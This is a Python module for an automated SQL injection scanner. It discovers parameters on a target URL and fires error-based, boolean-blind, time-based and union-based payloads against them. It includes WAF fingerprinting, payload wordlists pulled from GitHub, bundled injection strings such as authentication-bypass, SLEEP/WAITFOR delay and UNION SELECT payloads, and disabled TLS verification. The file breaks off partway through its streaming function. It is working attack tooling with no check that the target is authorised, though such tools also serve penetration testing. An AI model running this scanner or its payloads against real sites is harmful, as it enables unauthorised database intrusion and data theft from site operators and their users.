#!/usr/bin/env python3
"""
modules/sqli_engine.py — v1.0.0
═══════════════════════════════════════════════════════════════════════════
Professional SQL Injection engine — standalone, zero legacy dependencies.

Four detection/extraction techniques
    • error-based   — parse DB error signatures in responses
    • boolean-blind — compare True/False payload responses
    • time-based    — measure delay from SLEEP / WAITFOR / pg_sleep
    • union-based   — enumerate columns, extract via UNION SELECT

Features
    • 6 DB dialect signatures (MySQL, MariaDB, PostgreSQL, MSSQL,
      Oracle, SQLite)
    • Auto-download wordlists from GitHub (8 sources, circuit-breaker)
    • Token-bucket rate limiter (per-technique)
    • Cancel Event propagation into every request
    • Progress callback + SSE-friendly streaming API
    • Confidence scoring per finding with evidence trail
    • Baseline response comparison (reduces false positives)
    • Automatic parameter discovery (URL + HTML forms)
    • WAF detection (blocks known signature blocks)
    • Structured JSON output — compatible with exploit.js / sniper.py

Public API
    ─ run(url, options)                         → dict report
    ─ run_streaming(url, options, cancel_event) → Iterator[dict]
    ─ scan_single(url, param, options)          → dict | None
    ─ load_wordlist(name, max_lines)            → list[str]
    ─ ensure_wordlists()                        → dict metadata
    ─ WORDLIST_SOURCES                          → dict of GitHub sources

Author: Yanxzyx
"""

from __future__ import annotations

import concurrent.futures
import hashlib
import html
import logging
import random
import re
import string
import threading
import time
import urllib.parse
import uuid
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Callable, Dict, Iterable, Iterator, List, Optional, Set, Tuple

import requests
import urllib3
from bs4 import BeautifulSoup
from requests.adapters import HTTPAdapter

try:
    from urllib3.util.retry import Retry
except ImportError:
    from requests.packages.urllib3.util.retry import Retry  # type: ignore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logger = logging.getLogger("oxysintx.sqli_engine")
__version__ = "1.0.0"


# ═══════════════════════════════════════════════════════════════════════════
# Paths & tunables
# ═══════════════════════════════════════════════════════════════════════════
_PROJECT_ROOT = Path(__file__).resolve().parent.parent
WORDLIST_DIR = _PROJECT_ROOT / "wordlist"

DEFAULT_TIMEOUT      = 8.0
DEFAULT_RATE_LIMIT   = 20.0
DEFAULT_CONCURRENCY  = 8
DEFAULT_MAX_PARAMS   = 10
DEFAULT_MAX_DURATION = 90.0
TIME_DELAY_SECONDS   = 5.0   # must match payload value
TIME_DELAY_TOLERANCE = 3.5   # response delay must exceed this
BOOLEAN_DIFF_MIN_PCT = 15.0  # body length must differ by this %
MAX_RESPONSE_BYTES   = 65536
DOWNLOAD_COOLDOWN    = 300.0
MIN_WORDLIST_SIZE    = 5

_USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/120.0.0.0 Safari/537.36"
)


# ═══════════════════════════════════════════════════════════════════════════
# Wordlist sources (matches app.py SQLI_WORDLIST_SOURCES)
# ═══════════════════════════════════════════════════════════════════════════
WORDLIST_SOURCES: Dict[str, Dict[str, str]] = {
    "sqli_error_based.txt": {
        "url": "https://raw.githubusercontent.com/mad12wader/ffufwordlist/main/Generic%20Error%20Based%20Payloads",
        "source": "mad12wader/ffufwordlist",
        "technique": "error-based",
    },
    "sqli_time_based.txt": {
        "url": "https://raw.githubusercontent.com/mad12wader/ffufwordlist/main/Generic%20Time%20Based%20SQL%20Injection%20Payloads",
        "source": "mad12wader/ffufwordlist",
        "technique": "time-based",
    },
    "sqli_union_select.txt": {
        "url": "https://raw.githubusercontent.com/mad12wader/ffufwordlist/main/Union%20Select%20Payloads",
        "source": "mad12wader/ffufwordlist",
        "technique": "union-based",
    },
    "sqli_auth_bypass.txt": {
        "url": "https://raw.githubusercontent.com/mad12wader/ffufwordlist/main/SQL%20Injection%20Auth%20Bypass%20Payloads",
        "source": "mad12wader/ffufwordlist",
        "technique": "auth-bypass",
    },
    "sqli_seclists_generic.txt": {
        "url": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/Databases/SQL/Generic-SQLi.txt",
        "source": "danielmiessler/SecLists",
        "technique": "generic",
    },
    "sqli_seclists_quick.txt": {
        "url": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/Databases/SQLi/quick-SQLi.txt",
        "source": "danielmiessler/SecLists",
        "technique": "quick",
    },
    "sqli_seclists_polyglots.txt": {
        "url": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/Databases/SQLi/SQLi-Polyglots.txt",
        "source": "danielmiessler/SecLists",
        "technique": "polyglot",
    },
    "sqli_coffinxp.txt": {
        "url": "https://raw.githubusercontent.com/coffinxp/payloads/main/allsqli.txt",
        "source": "coffinxp/payloads",
        "technique": "multi",
    },
}


# ═══════════════════════════════════════════════════════════════════════════
# Bundled payloads (fallback when GitHub is unreachable)
# ═══════════════════════════════════════════════════════════════════════════
_BUNDLED_ERROR: List[str] = [
    "'",
    "\"",
    "'--",
    "\"--",
    "'#",
    "')",
    "')--",
    "';",
    "' OR '1'='1",
    "' AND '1'='2",
    "') OR ('1'='1",
    "1' AND extractvalue(1,concat(0x7e,version()))--",
    "1' AND updatexml(1,concat(0x7e,version()),1)--",
    "1 AND 1=convert(int,@@version)--",
    "' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--",
]

_BUNDLED_TIME: List[str] = [
    "' AND SLEEP(5)--",
    "' AND SLEEP(5)#",
    "\" AND SLEEP(5)--",
    "1' AND SLEEP(5)--",
    "1 AND SLEEP(5)--",
    "'; SELECT pg_sleep(5)--",
    "' AND 1=(SELECT 1 FROM PG_SLEEP(5))--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' WAITFOR DELAY '0:0:5'--",
    "1; WAITFOR DELAY '0:0:5'--",
    "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
    "' AND 1=(SELECT 1 FROM DBMS_LOCK.SLEEP(5))--",
    "' AND randomblob(100000000)--",
]

_BUNDLED_BOOLEAN_TRUE: List[str] = [
    "' AND '1'='1",
    "' AND 1=1--",
    "' AND 'a'='a",
    "\" AND \"1\"=\"1",
    "1 AND 1=1",
    "') AND ('1'='1",
]

_BUNDLED_BOOLEAN_FALSE: List[str] = [
    "' AND '1'='2",
    "' AND 1=2--",
    "' AND 'a'='b",
    "\" AND \"1\"=\"2",
    "1 AND 1=2",
    "') AND ('1'='2",
]

_BUNDLED_UNION: List[str] = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "' UNION ALL SELECT NULL--",
    "' UNION SELECT 1,2,3--",
    "1 UNION SELECT NULL--",
]


# ═══════════════════════════════════════════════════════════════════════════
# Database dialect signatures
# ═══════════════════════════════════════════════════════════════════════════
_DB_SIGNATURES: Dict[str, List[str]] = {
    "MySQL": [
        r"You have an error in your SQL syntax",
        r"Warning:\s+mysql_",
        r"MySQLSyntaxErrorException",
        r"check the manual that corresponds to your MySQL",
        r"check the manual that corresponds to your MariaDB",
        r"com\.mysql\.jdbc",
    ],
    "MariaDB": [
        r"check the manual that corresponds to your MariaDB",
        r"MariaDB server version",
    ],
    "PostgreSQL": [
        r"PostgreSQL.*ERROR",
        r"pg_query\(\)",
        r"PG::SyntaxError",
        r"unterminated quoted string at or near",
        r"WARNING:\s+pg_",
        r"org\.postgresql\.util\.PSQLException",
    ],
    "MSSQL": [
        r"Microsoft OLE DB Provider for SQL Server",
        r"Unclosed quotation mark after the character string",
        r"Microsoft SQL Server.*Driver",
        r"System\.Data\.SqlClient\.SqlException",
        r"Incorrect syntax near",
        r"ODBC SQL Server Driver",
    ],
    "Oracle": [
        r"ORA-\d{5}",
        r"Oracle error",
        r"quoted string not properly terminated",
        r"oracle\.jdbc",
    ],
    "SQLite": [
        r"SQLite/JDBCDriver",
        r"SQLite\.Exception",
        r"System\.Data\.SQLite\.SQLiteException",
        r"Warning.*sqlite_",
        r"unrecognized token",
    ],
}

_WAF_SIGNATURES: Dict[str, List[str]] = {
    "Cloudflare":    ["cloudflare", "cf-ray", "__cfduid", "cf-cache-status"],
    "AWS WAF":       ["awselb", "x-amz-cf-id", "x-amzn-requestid"],
    "ModSecurity":   ["mod_security", "modsecurity"],
    "Sucuri":        ["sucuri", "x-sucuri-id"],
    "Incapsula":     ["incap_ses", "visid_incap", "incapsula"],
    "F5 BIG-IP":     ["bigipserver", "tscookie", "f5-"],
    "Wordfence":     ["wordfence"],
    "Barracuda":     ["barra_counter_session", "barracuda"],
}


# ═══════════════════════════════════════════════════════════════════════════
# Data structures
# ═══════════════════════════════════════════════════════════════════════════
@dataclass
class Finding:
    parameter: str
    technique: str
    payload: str
    db_hint: Optional[str] = None
    status: str = "possible"      # confirmed | probable | possible
    confidence: float = 0.5
    evidence: List[Dict[str, Any]] = field(default_factory=list)
    extracted: Optional[Dict[str, Any]] = None

    def to_public_dict(self) -> Dict[str, Any]:
        return {
            "parameter": self.parameter,
            "technique": self.technique,
            "payload": self.payload,
            "db_hint": self.db_hint,
            "status": self.status,
            "confidence": round(self.confidence, 2),
            "evidence": self.evidence[:10],
            "extracted": self.extracted,
        }


@dataclass
class ScanReport:
    url: str
    started_at: str
    finished_at: str = ""
    elapsed: float = 0.0
    requests_sent: int = 0
    parameters_tested: List[str] = field(default_factory=list)
    techniques_tested: List[str] = field(default_factory=list)
    waf_detected: Optional[str] = None
    findings: List[Finding] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)
    vulnerable: bool = False

    def to_public_dict(self) -> Dict[str, Any]:
        return {
            "url": self.url,
            "started_at": self.started_at,
            "finished_at": self.finished_at,
            "elapsed": round(self.elapsed, 2),
            "requests_sent": self.requests_sent,
            "parameters_tested": self.parameters_tested,
            "techniques_tested": self.techniques_tested,
            "waf_detected": self.waf_detected,
            "vulnerable": self.vulnerable,
            "findings": [f.to_public_dict() for f in self.findings],
            "errors": self.errors[:10],
            "version": __version__,
        }


# ═══════════════════════════════════════════════════════════════════════════
# Wordlist management
# ═══════════════════════════════════════════════════════════════════════════
_wordlist_cache: Dict[str, List[str]] = {}
_wordlist_lock = threading.RLock()
_last_download_attempt: float = 0.0


def _ensure_wordlist_dir() -> None:
    WORDLIST_DIR.mkdir(parents=True, exist_ok=True)


def _filter_line(line: str) -> Optional[str]:
    s = line.strip()
    if not s or s.startswith(("#", "//", ";")):
        return None
    if len(s) > 512:
        return None
    return s


def _download_wordlist(name: str, url: str, max_lines: int) -> Optional[List[str]]:
    global _last_download_attempt
    now = time.monotonic()
    if now - _last_download_attempt < DOWNLOAD_COOLDOWN:
        logger.info("[sqli] wordlist download on cooldown — using bundled")
        return None
    _last_download_attempt = now

    try:
        r = requests.get(url, timeout=15.0,
                          headers={"User-Agent": _USER_AGENT})
        if r.status_code != 200:
            logger.warning("[sqli] %s -> HTTP %s", name, r.status_code)
            return None
        lines: List[str] = []
        for raw in r.text.splitlines():
            s = _filter_line(raw)
            if s:
                lines.append(s)
            if len(lines) >= max_lines:
                break
        if len(lines) < MIN_WORDLIST_SIZE:
            logger.warning("[sqli] %s only %d entries — skipping", name, len(lines))
            return None
        return lines
    except Exception as e:
        logger.warning("[sqli] download %s failed: %s", name, e)
        return None


def load_wordlist(name: str, max_lines: int = 200) -> List[str]:
    """Load a wordlist by name, downloading from GitHub if needed."""
    with _wordlist_lock:
        if name in _wordlist_cache:
            return _wordlist_cache[name][:max_lines]

        _ensure_wordlist_dir()
        target = (WORDLIST_DIR / Path(name).name).resolve()
        try:
            target.relative_to(WORDLIST_DIR.resolve())
        except ValueError:
            return []

        if target.exists() and target.stat().st_size > 0:
            try:
                lines: List[str] = []
                with target.open("r", encoding="utf-8", errors="replace") as f:
                    for raw in f:
                        s = _filter_line(raw)
                        if s:
                            lines.append(s)
                        if len(lines) >= max_lines:
                            break
                if lines:
                    _wordlist_cache[name] = lines
                    return lines
            except OSError:
                pass

        meta = WORDLIST_SOURCES.get(Path(name).name)
        if meta:
            downloaded = _download_wordlist(Path(name).name, meta["url"], max_lines)
            if downloaded:
                try:
                    target.write_text(
                        f"# {Path(name).name} — from {meta['source']}\n\n"
                        + "\n".join(downloaded),
                        encoding="utf-8",
                    )
                except OSError:
                    pass
                _wordlist_cache[name] = downloaded
                return downloaded

        return []


def ensure_wordlists() -> Dict[str, Any]:
    """Ensure the primary wordlists exist. Returns metadata."""
    out: Dict[str, Any] = {"wordlists": [], "sources": WORDLIST_SOURCES}
    for name in ("sqli_error_based.txt", "sqli_time_based.txt",
                  "sqli_union_select.txt", "sqli_seclists_generic.txt"):
        entries = load_wordlist(name, max_lines=200)
        out["wordlists"].append({
            "name": name,
            "count": len(entries),
            "source": WORDLIST_SOURCES.get(name, {}).get("source", "bundled"),
        })
    return out


# ═══════════════════════════════════════════════════════════════════════════
# Token bucket rate limiter
# ═══════════════════════════════════════════════════════════════════════════
class _TokenBucket:
    def __init__(self, rate: float, burst: int = 4):
        self.rate = max(0.1, float(rate))
        self.burst = max(1, int(burst))
        self._tokens = float(self.burst)
        self._last = time.monotonic()
        self._lock = threading.Lock()

    def acquire(self, timeout: float = 20.0) -> bool:
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            with self._lock:
                now = time.monotonic()
                self._tokens = min(self.burst,
                                    self._tokens + (now - self._last) * self.rate)
                self._last = now
                if self._tokens >= 1.0:
                    self._tokens -= 1.0
                    return True
                wait = (1.0 - self._tokens) / self.rate
            time.sleep(min(wait, 0.15))
        return False


# ═══════════════════════════════════════════════════════════════════════════
# Helpers
# ═══════════════════════════════════════════════════════════════════════════
def _build_session() -> requests.Session:
    s = requests.Session()
    adapter = HTTPAdapter(
        pool_connections=16, pool_maxsize=32,
        max_retries=Retry(total=1, backoff_factor=0.3,
                          status_forcelist=(502, 503, 504),
                          allowed_methods=frozenset(["GET", "POST"]),
                          raise_on_status=False),
    )
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    s.headers.update({
        "User-Agent": _USER_AGENT,
        "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate",
    })
    return s


def _read_capped(r: requests.Response, cap: int = MAX_RESPONSE_BYTES) -> str:
    buf = b""
    try:
        for chunk in r.iter_content(chunk_size=4096):
            buf += chunk
            if len(buf) >= cap:
                break
    except Exception:
        pass
    finally:
        try:
            r.close()
        except Exception:
            pass
    try:
        return buf.decode("utf-8", errors="replace")
    except Exception:
        return buf.decode("latin-1", errors="replace")


def _detect_waf(headers: Dict[str, str], body: str) -> Optional[str]:
    haystack = (" ".join(f"{k}: {v}" for k, v in headers.items())
                + " " + body[:4000]).lower()
    for name, sigs in _WAF_SIGNATURES.items():
        if any(sig in haystack for sig in sigs):
            return name
    return None


def _detect_db_from_body(body: str) -> Optional[str]:
    """Return the first DB dialect whose signature matches the body."""
    body_l = body.lower()
    for db, patterns in _DB_SIGNATURES.items():
        for pattern in patterns:
            if re.search(pattern, body, re.I):
                return db
    return None


def _body_fingerprint(status: int, body: str) -> Tuple[int, int, str]:
    """Return (status, length, md5_hash) for response comparison."""
    return (
        status,
        len(body),
        hashlib.md5(body.encode("utf-8", "ignore")).hexdigest()[:16],
    )


def _discover_params(url: str, session: requests.Session,
                      timeout: float = 6.0) -> List[str]:
    """Discover parameters from URL query + HTML forms + inline anchors."""
    params: List[str] = []
    seen: Set[str] = set()

    def add(p: str) -> None:
        p = (p or "").strip()
        if p and p not in seen and len(p) <= 64:
            seen.add(p)
            params.append(p)

    # 1. URL query string
    try:
        parsed = urllib.parse.urlparse(url)
        for k, _ in urllib.parse.parse_qsl(parsed.query, keep_blank_values=True):
            add(k)
    except Exception:
        pass

    # 2. HTML forms (input/textarea/select name attributes)
    try:
        r = session.get(url, timeout=timeout, verify=False)
        if r.status_code < 400:
            soup = BeautifulSoup(r.text, "html.parser")
            for inp in soup.find_all(["input", "textarea", "select"]):
                name = inp.get("name")
                if name:
                    add(name)
    except Exception:
        pass

    # 3. Common parameter fallback
    if not params:
        params = ["id", "q", "search", "query", "page", "cat", "item",
                  "product", "user", "username", "email", "name", "sort",
                  "filter", "order"]

    return params[:40]


def _extract_error_evidence(body: str) -> Tuple[Optional[str], Optional[str]]:
    """Return (db_dialect, matched_signature) if an error is present."""
    for db, patterns in _DB_SIGNATURES.items():
        for pattern in patterns:
            m = re.search(pattern, body, re.I)
            if m:
                return db, m.group(0)[:120]
    return None, None


# ═══════════════════════════════════════════════════════════════════════════
# Scanner
# ═══════════════════════════════════════════════════════════════════════════
class SqliScanner:
    def __init__(self,
                 *,
                 timeout: float = DEFAULT_TIMEOUT,
                 rate_limit: float = DEFAULT_RATE_LIMIT,
                 concurrency: int = DEFAULT_CONCURRENCY,
                 max_duration: float = DEFAULT_MAX_DURATION,
                 cancel_event: Optional[threading.Event] = None,
                 progress_cb: Optional[Callable[[int, int, str], None]] = None,
                 method: str = "GET",
                 headers: Optional[Dict[str, str]] = None,
                 cookies: Optional[Dict[str, str]] = None):
        self.timeout = float(timeout)
        self.bucket = _TokenBucket(rate=rate_limit, burst=4)
        self.concurrency = max(1, min(int(concurrency), 16))
        self.max_duration = float(max_duration)
        self._stop = cancel_event or threading.Event()
        self._progress_cb = progress_cb
        self.method = method.upper()
        self._session = _build_session()
        if headers:
            self._session.headers.update(headers)
        if cookies:
            self._session.cookies.update(cookies)
        self._req_count = 0
        self._req_lock = threading.Lock()
        self._done = 0
        self._total = 0
        self._started_mono = 0.0
        self._baseline_fp: Optional[Tuple[int, int, str]] = None
        self._baseline_body: str = ""
        self._baseline_time: float = 0.0

    def cancel(self) -> None:
        self._stop.set()

    def _budget_exceeded(self) -> bool:
        return (time.monotonic() - self._started_mono) > self.max_duration

    def _emit(self, label: str = "") -> None:
        if not self._progress_cb:
            return
        try:
            self._progress_cb(self._done, self._total, label)
        except Exception:
            pass

    # ── Low-level send ─────────────────────────────────────────────────
    def _send(self, url: str, param: str, payload: str,
               use_post: bool = False) -> Optional[Dict[str, Any]]:
        if self._stop.is_set() or self._budget_exceeded():
            return None
        if not self.bucket.acquire(timeout=15.0):
            return None

        t0 = time.monotonic()
        try:
            if use_post:
                r = self._session.post(
                    url, data={param: payload},
                    timeout=self.timeout, verify=False,
                    allow_redirects=False, stream=True,
                )
            else:
                r = self._session.get(
                    url, params={param: payload},
                    timeout=self.timeout, verify=False,
                    allow_redirects=False, stream=True,
                )
            body = _read_capped(r)
            elapsed = time.monotonic() - t0
            with self._req_lock:
                self._req_count += 1
            return {
                "status": r.status_code,
                "headers": dict(r.headers),
                "body": body,
                "elapsed": elapsed,
            }
        except requests.exceptions.Timeout:
            # Timeouts may still indicate time-based SQLi
            return {
                "status": 0, "headers": {}, "body": "",
                "elapsed": time.monotonic() - t0, "timeout": True,
            }
        except requests.exceptions.RequestException:
            return None

    # ── Baseline ───────────────────────────────────────────────────────
    def establish_baseline(self, url: str, params: List[str]) -> bool:
        """Fetch the target twice with a random marker to fingerprint."""
        marker = f"sqli{uuid.uuid4().hex[:8]}"
        first = self._send(url, params[0] if params else "q", marker)
        if first is None:
            return False
        self._baseline_fp = _body_fingerprint(first["status"], first["body"])
        self._baseline_body = first["body"]
        self._baseline_time = first["elapsed"]
        return True

    # ── Techniques ─────────────────────────────────────────────────────

    def _test_error_based(self, url: str, param: str,
                            payloads: List[str]) -> Optional[Finding]:
        for payload in payloads[:40]:
            if self._stop.is_set() or self._budget_exceeded():
                return None
            resp = self._send(url, param, payload)
            self._done += 1
            if resp is None:
                continue
            db, evidence = _extract_error_evidence(resp["body"])
            # Baseline must NOT contain the same signature
            base_db, _ = _extract_error_evidence(self._baseline_body)
            if db and db != base_db:
                return Finding(
                    parameter=param,
                    technique="error-based",
                    payload=payload,
                    db_hint=db,
                    status="confirmed",
                    confidence=0.95,
                    evidence=[{
                        "type": "db_error_signature",
                        "db": db,
                        "signature": evidence,
                        "status": resp["status"],
                    }],
                )
        return None

    def _test_boolean_blind(self, url: str, param: str,
                              true_payloads: List[str],
                              false_payloads: List[str]) -> Optional[Finding]:
        # Pair each True with the corresponding False
        pairs = list(zip(true_payloads[:10], false_payloads[:10]))
        if not pairs:
            return None

        for true_pl, false_pl in pairs:
            if self._stop.is_set() or self._budget_exceeded():
                return None
            resp_true = self._send(url, param, true_pl)
            resp_false = self._send(url, param, false_pl)
            self._done += 2
            if resp_true is None or resp_false is None:
                continue

            fp_true = _body_fingerprint(resp_true["status"], resp_true["body"])
            fp_false = _body_fingerprint(resp_false["status"], resp_false["body"])

            # Conditions:
            #   • Same HTTP status (else it's a shortcut — skip)
            #   • Same content length bucket means no diff
            #   • Body hash must differ
            if fp_true[0] != fp_false[0]:
                continue
            if fp_true[2] == fp_false[2]:
                continue

            # Length difference must be meaningful OR hash-only diff
            len_diff_pct = (
                abs(fp_true[1] - fp_false[1]) / max(fp_true[1], fp_false[1], 1)
            ) * 100.0

            if len_diff_pct < BOOLEAN_DIFF_MIN_PCT and fp_true[1] == fp_false[1]:
                continue

            # Verify — reverse the pair; if diff still shows → probable
            resp_true2 = self._send(url, param, true_pl)
            resp_false2 = self._send(url, param, false_pl)
            self._done += 2
            if resp_true2 is None or resp_false2 is None:
                continue
            fp_true2 = _body_fingerprint(resp_true2["status"], resp_true2["body"])
            fp_false2 = _body_fingerprint(resp_false2["status"], resp_false2["body"])

            # Both attempts must agree: True→T, False→F consistently
            true_consistent = (fp_true[2] == fp_true2[2])
            false_consistent = (fp_false[2] == fp_false2[2])
            diff_reproducible = (fp_true2[2] != fp_false2[2])

            if not (true_consistent and false_consistent and diff_reproducible):
                continue

            return Finding(
                parameter=param,
                technique="boolean-blind",
                payload=true_pl,
                status="confirmed",
                confidence=0.85,
                evidence=[{
                    "type": "boolean_diff",
                    "true_hash": fp_true[2],
                    "false_hash": fp_false[2],
                    "true_len": fp_true[1],
                    "false_len": fp_false[1],
                    "diff_pct": round(len_diff_pct, 1),
                }],
            )
        return None

    def _test_time_based(self, url: str, param: str,
                          payloads: List[str]) -> Optional[Finding]:
        if self._baseline_time <= 0:
            return None

        for payload in payloads[:20]:
            if self._stop.is_set() or self._budget_exceeded():
                return None

            # First attempt
            resp1 = self._send(url, param, payload)
            self._done += 1
            if resp1 is None:
                continue
            delay1 = resp1["elapsed"] - self._baseline_time
            if delay1 < TIME_DELAY_TOLERANCE:
                continue

            # Second attempt to confirm (avoid network jitter)
            resp2 = self._send(url, param, payload)
            self._done += 1
            if resp2 is None:
                continue
            delay2 = resp2["elapsed"] - self._baseline_time
            if delay2 < TIME_DELAY_TOLERANCE:
                continue

            # Both attempts reproduced the delay
            avg_delay = (delay1 + delay2) / 2.0
            return Finding(
                parameter=param,
                technique="time-based",
                payload=payload,
                status="confirmed",
                confidence=0.9,
                evidence=[{
                    "type": "reproduced_delay",
                    "baseline_s": round(self._baseline_time, 2),
                    "attempt1_s": round(resp1["elapsed"], 2),
                    "attempt2_s": round(resp2["elapsed"], 2),
                    "avg_delay_s": round(avg_delay, 2),
                }],
            )
        return None

    def _test_union_based(self, url: str, param: str,
                           payloads: List[str]) -> Optional[Finding]:
        # Detect if any payload causes a length/status change from baseline
        if not self._baseline_fp:
            return None
        base_status, base_len, base_hash = self._baseline_fp

        for payload in payloads[:30]:
            if self._stop.is_set() or self._budget_exceeded():
                return None
            resp = self._send(url, param, payload)
            self._done += 1
            if resp is None:
                continue
            if resp["status"] != base_status:
                continue
            if resp["status"] >= 500:
                continue

            # Union often produces a distinct response size/hash
            cur_fp = _body_fingerprint(resp["status"], resp["body"])
            if cur_fp[2] == base_hash:
                continue
            if cur_fp[1] == base_len:
                continue

            # Confirm by repeating
            resp2 = self._send(url, param, payload)
            self._done += 1
            if resp2 is None:
                continue
            cur_fp2 = _body_fingerprint(resp2["status"], resp2["body"])
            if cur_fp2[2] != cur_fp[2]:
                continue

            return Finding(
                parameter=param,
                technique="union-based",
                payload=payload,
                status="probable",
                confidence=0.75,
                evidence=[{
                    "type": "union_response_diff",
                    "baseline_len": base_len,
                    "response_len": cur_fp[1],
                    "response_hash": cur_fp[2],
                }],
            )
        return None

    # ── Full scan ──────────────────────────────────────────────────────
    def scan(self, url: str, *,
             params: Optional[List[str]] = None,
             techniques: Optional[List[str]] = None,
             max_params: int = DEFAULT_MAX_PARAMS) -> ScanReport:
        started = datetime.now(timezone.utc)
        self._started_mono = time.monotonic()
        report = ScanReport(url=url, started_at=started.isoformat())

        # Wordlist loading
        error_pls = load_wordlist("sqli_error_based.txt", 60) or _BUNDLED_ERROR
        time_pls = load_wordlist("sqli_time_based.txt", 40) or _BUNDLED_TIME
        union_pls = load_wordlist("sqli_union_select.txt", 40) or _BUNDLED_UNION
        true_pls = _BUNDLED_BOOLEAN_TRUE
        false_pls = _BUNDLED_BOOLEAN_FALSE

        techniques = techniques or ["error", "boolean", "time", "union"]
        report.techniques_tested = list(techniques)

        # Parameter discovery
        if params is None:
            params = _discover_params(url, self._session, timeout=self.timeout)
        params = params[:max_params]
        report.parameters_tested = list(params)
        if not params:
            report.errors.append("no parameters to test")
            report.finished_at = datetime.now(timezone.utc).isoformat()
            report.elapsed = time.monotonic() - self._started_mono
            return report

        # Baseline
        if not self.establish_baseline(url, params):
            report.errors.append("baseline request failed")
            report.finished_at = datetime.now(timezone.utc).isoformat()
            report.elapsed = time.monotonic() - self._started_mono
            return report

        # WAF detection
        report.waf_detected = _detect_waf(
            dict(self._session.headers), self._baseline_body
        )

        self._total = len(params) * len(techniques)
        self._done = 0

        findings: List[Finding] = []
        findings_lock = threading.Lock()

        def worker(param: str) -> None:
            if self._stop.is_set() or self._budget_exceeded():
                return
            local_findings: List[Finding] = []

            if "error" in techniques:
                f = self._test_error_based(url, param, error_pls)
                if f:
                    local_findings.append(f)

            if "boolean" in techniques:
                f = self._test_boolean_blind(url, param, true_pls, false_pls)
                if f:
                    local_findings.append(f)

            if "time" in techniques:
                f = self._test_time_based(url, param, time_pls)
                if f:
                    local_findings.append(f)

            if "union" in techniques:
                f = self._test_union_based(url, param, union_pls)
                if f:
                    local_findings.append(f)

            with findings_lock:
                findings.extend(local_findings)

            self._emit(f"{param}")

        with concurrent.futures.ThreadPoolExecutor(
            max_workers=self.concurrency
        ) as pool:
            futures = [pool.submit(worker, p) for p in params]
            for fut in concurrent.futures.as_completed(futures):
                if self._stop.is_set() or self._budget_exceeded():
                    for f in futures:
                        f.cancel()
                    break
                try:
                    fut.result()
                except Exception:
                    continue

        # Sort: highest confidence first
        findings.sort(key=lambda f: -f.confidence)
        report.findings = findings
        report.vulnerable = any(f.confidence >= 0.7 for f in findings)
        report.requests_sent = self._req_count
        report.finished_at = datetime.now(timezone.utc).isoformat()
        report.elapsed = time.monotonic() - self._started_mono
        self._emit("complete")
        return report


# ═══════════════════════════════════════════════════════════════════════════
# Public API
# ═══════════════════════════════════════════════════════════════════════════
def _normalise_options(options: Optional[Dict[str, Any]]) -> Dict[str, Any]:
    options = options or {}

    def _i(key, default, lo, hi):
        try:
            return max(lo, min(hi, int(options.get(key, default))))
        except (TypeError, ValueError):
            return default

    def _f(key, default, lo, hi):
        try:
            return max(lo, min(hi, float(options.get(key, default))))
        except (TypeError, ValueError):
            return default

    return {
        "techniques":    options.get("techniques") or ["error", "boolean", "time", "union"],
        "params":        options.get("params") or None,
        "max_params":    _i("max_params", DEFAULT_MAX_PARAMS, 1, 40),
        "concurrency":   _i("concurrency", DEFAULT_CONCURRENCY, 1, 16),
        "rate_limit":    _f("rate_limit", DEFAULT_RATE_LIMIT, 1.0, 100.0),
        "timeout":       _f("timeout", DEFAULT_TIMEOUT, 2.0, 30.0),
        "max_duration":  _f("max_duration", DEFAULT_MAX_DURATION, 10.0, 300.0),
        "method":        (options.get("method") or "GET").upper(),
        "headers":       options.get("headers") or None,
        "cookies":       options.get("cookies") or None,
        "cancel_event":  options.get("cancel_event"),
        "progress_cb":   options.get("progress_cb"),
    }


def run(url: str, options: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """Blocking SQLi scan. Returns the report as a dict."""
    o = _normalise_options(options)

    if not url or not url.strip():
        raise ValueError("url is required")
    url = url.strip()
    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    scanner = SqliScanner(
        timeout=o["timeout"],
        rate_limit=o["rate_limit"],
        concurrency=o["concurrency"],
        max_duration=o["max_duration"],
        cancel_event=o["cancel_event"],
        progress_cb=o["progress_cb"],
        method=o["method"],
        headers=o["headers"],
        cookies=o["cookies"],
    )
    report = scanner.scan(
        url,
        params=o["params"],
        techniques=o["techniques"],
        max_params=o["max_params"],
    )
    public = report.to_public_dict()
    return {
        **public,
        "mode": "auto",
        "findings_count": len(public["findings"]),
    }


def scan_single(url: str, param: str,
                options: Optional[Dict[str, Any]] = None
                ) -> Optional[Dict[str, Any]]:
    """Scan a single parameter directly."""
    o = _normalise_options(options)
    o["params"] = [param]
    o["max_params"] = 1
    result = run(url, o)
    return result["findings"][0] if result["findings"] else None


def run_streaming(url: str,
                   options: Optional[Dict[str, Any]] = None,
                   cancel_event: Optional[threading.Event] = None
                   ) -> Iterator[Dict[str, Any]]:
    """Yield SSE-friendly events, then the final report."""
    o = _normalise_options(options)
    if cancel_event is not None:
        o["cancel_event"] = cancel_event

    events: List[Dict[str, Any]] = []
    events_lock = threading.Lock()
    done = threading.Event()

    def _progress(done_count: int, total: int, label: str) -> None:
        pct = int((done_count / total) * 100) if total else 0
        with events_lock:
            events.append({
                "type": "progress",
                "done": done_count,
                "total": total,
                "percent": pct,
                "label": label,
            })

    o["progress_cb"] = _progress
    result_holder: Dict[str, Any] = {}

    def _worker() -> None:
        try:
            result_holder["result"] = run(url, o)
        except Exception as e:  # noqa: BLE001
            result_holder["error"] = str(e)
        finally:
